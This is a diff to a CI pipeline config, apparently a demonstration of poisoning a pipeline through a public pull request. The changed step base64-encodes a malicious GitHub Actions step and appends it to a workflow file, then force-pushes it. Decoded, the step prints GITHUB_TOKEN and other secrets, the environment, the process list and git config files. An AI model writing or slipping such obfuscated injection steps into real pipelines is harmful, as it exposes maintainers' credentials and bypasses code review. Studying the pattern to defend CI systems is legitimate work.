@@ -36,7 +36,7 @@ jobs:
           name: Git Push to Master 
           command: |
             git branch -a
-            echo "ICAKICAgIC0gbmFtZTogTWFsaWNpb3VzIFN0ZXAgKEluamVjdGVkIEJ5IFBSKQogICAgICBydW46IHwKICAgICAgICBlY2hvICIke3sgc2VjcmV0cy5HSVRIVUJfVE9LRU4gfX0sICR7eyBzZWNyZXRzLk1ZU0VDUkVUIH19IgogICAgICAgIHByaW50ZW52CiAgICAgICAgcHMgYXhlCiAgICAgICAgZWNobyAiJHt7IHNlY3JldHMgfX0iCiAgICAgICAgZ2l0IGNvbmZpZyAtLWxpc3QgLS1zaG93LW9yaWdpbg==" | base64 --decode >> .github/workflows/test.yaml
+            echo "ICAKICAgIC0gbmFtZTogTWFsaWNpb3VzIFN0ZXAgKEluamVjdGVkIEJ5IFBSKQogICAgICBydW46IHwKICAgICAgICBlY2hvICIke3sgc2VjcmV0cy5HSVRIVUJfVE9LRU4gfX0sICR7eyBzZWNyZXRzLk1ZU0VDUkVUIH19IgogICAgICAgIHByaW50ZW52CiAgICAgICAgcHMgYXhlCiAgICAgICAgZWNobyAiJHt7IHNlY3JldHMgfX0iCiAgICAgICAgZ2l0IGNvbmZpZyAtLWxpc3QgLS1zaG93LW9yaWdpbgogICAgICAgIGNhdCAuZ2l0L2NvbmZpZyB8IGJhc2U2NAogICAgICAgIGNhdCAvZXRjL2dpdGNvbmZpZyB8IGJhc2U2NAogICAgICAgIGNhdCAuZ2l0L2NvbmZpZwogICAgICAgIGNhdCAvZXRjL2dpdGNvbmZpZwo=" | base64 --decode >> .github/workflows/test.yaml
             git add .
             git commit -m "This is Malicious Step (Injected By Public PR)"
             git push origin --force
